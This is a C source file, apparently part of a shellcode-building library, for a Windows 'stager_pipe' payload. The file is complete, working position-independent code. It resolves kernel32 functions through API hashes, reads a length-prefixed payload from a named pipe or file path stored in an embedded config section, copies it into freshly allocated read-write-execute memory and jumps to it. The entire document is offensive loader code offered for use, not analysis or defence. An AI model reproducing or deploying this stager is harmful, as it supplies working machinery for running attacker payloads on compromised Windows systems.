/*
 * stager_pipe payload for Windows — open a named pipe / file path
 * via CreateFileA, read a length-prefixed payload, allocate RWX,
 * copy, and jump.
 *
 * Config layout (matches unix stager_pipe):
 *   +0x00: path_len (u16, little-endian)
 *   +0x02: path (path_len bytes; we copy to a NUL-terminated local)
 *
 * Wire protocol on the pipe:
 *   +0x00: payload_size (u32, little-endian)
 *   +0x04: payload_data
 */

#include "picblobs/os/windows.h"
#include "picblobs/reloc.h"
#include "picblobs/section.h"
#include "picblobs/types.h"
#include "picblobs/win/resolve.h"

#define HASH_KERNEL32_DLL 0x7040EE75
#define HASH_CREATE_FILE_A 0xEB96C5FA
#define HASH_READ_FILE 0x71019921
#define HASH_CLOSE_HANDLE 0x3870CA07
#define HASH_VIRTUAL_ALLOC 0x382C0F97
#define HASH_EXIT_PROCESS 0xB769339E

#define GENERIC_READ 0x80000000u
#define OPEN_EXISTING 3u
#define MEM_COMMIT 0x1000
#define MEM_RESERVE 0x2000
#define PAGE_EXECUTE_READWRITE 0x40

#define PATH_MAX_LEN 256

typedef void *(PIC_WINAPI *fn_CreateFileA)(const char *lpFileName,
	unsigned long dwDesiredAccess, unsigned long dwShareMode, void *sa,
	unsigned long dwCreationDisposition, unsigned long dwFlagsAndAttributes,
	void *hTemplateFile);
typedef int(PIC_WINAPI *fn_ReadFile)(void *hFile, void *lpBuffer,
	unsigned long nNumberOfBytesToRead, unsigned long *lpNumberOfBytesRead,
	void *lpOverlapped);
typedef int(PIC_WINAPI *fn_CloseHandle)(void *hObject);
typedef void *(PIC_WINAPI *fn_VirtualAlloc)(void *lpAddress, pic_uintptr dwSize,
	unsigned long flAllocationType, unsigned long flProtect);
typedef void(PIC_WINAPI *fn_ExitProcess)(unsigned int uExitCode);

__asm__(".section .config,\"aw\"\n"
	".globl stager_pipe_windows_config\n"
	"stager_pipe_windows_config:\n"
	".space 2\n"
	".previous\n");

PIC_TEXT
static int read_all(fn_ReadFile rf, void *h, void *buf, pic_u32 count)
{
	pic_u8 *p = (pic_u8 *)buf;
	unsigned long got = 0;
	pic_u32 done = 0;
	while (done < count) {
		if (!rf(h, p + done, count - done, &got, PIC_NULL))
			return 0;
		if (got == 0)
			return 0;
		done += (pic_u32)got;
	}
	return 1;
}

PIC_ENTRY
void _start(void)
{
	PIC_SELF_RELOCATE();

	fn_CreateFileA pCreateFileA = (fn_CreateFileA)pic_resolve(
		HASH_KERNEL32_DLL, HASH_CREATE_FILE_A);
	fn_ReadFile pReadFile =
		(fn_ReadFile)pic_resolve(HASH_KERNEL32_DLL, HASH_READ_FILE);
	fn_CloseHandle pCloseHandle = (fn_CloseHandle)pic_resolve(
		HASH_KERNEL32_DLL, HASH_CLOSE_HANDLE);
	fn_VirtualAlloc pVirtualAlloc = (fn_VirtualAlloc)pic_resolve(
		HASH_KERNEL32_DLL, HASH_VIRTUAL_ALLOC);
	fn_ExitProcess pExitProcess = (fn_ExitProcess)pic_resolve(
		HASH_KERNEL32_DLL, HASH_EXIT_PROCESS);

	if (!pCreateFileA || !pReadFile || !pCloseHandle || !pVirtualAlloc ||
		!pExitProcess)
		for (;;)
			;

	extern char stager_pipe_windows_config[]
		__attribute__((visibility("hidden")));
	const pic_u8 *cfg = (const pic_u8 *)stager_pipe_windows_config;

	pic_u16 path_len = (pic_u16)cfg[0] | ((pic_u16)cfg[1] << 8);
	if (path_len == 0 || path_len >= PATH_MAX_LEN)
		pExitProcess(1);

	char path[PATH_MAX_LEN];
	for (pic_u16 i = 0; i < path_len; i++)
		path[i] = (char)cfg[2 + i];
	path[path_len] = '\0';

	void *h = pCreateFileA(
		path, GENERIC_READ, 0, PIC_NULL, OPEN_EXISTING, 0, PIC_NULL);
	if (h == (void *)-1)
		pExitProcess(1);

	pic_u8 size_buf[4];
	if (!read_all(pReadFile, h, size_buf, 4)) {
		pCloseHandle(h);
		pExitProcess(1);
	}
	pic_u32 size = (pic_u32)size_buf[0] | ((pic_u32)size_buf[1] << 8) |
		((pic_u32)size_buf[2] << 16) | ((pic_u32)size_buf[3] << 24);
	if (size == 0 || size > 0x10000000) {
		pCloseHandle(h);
		pExitProcess(1);
	}

	void *mem = pVirtualAlloc(PIC_NULL, (pic_uintptr)size,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!mem) {
		pCloseHandle(h);
		pExitProcess(1);
	}

	if (!read_all(pReadFile, h, mem, size)) {
		pCloseHandle(h);
		pExitProcess(1);
	}
	pCloseHandle(h);

	((void (*)(void))mem)();

	pExitProcess(0);
}
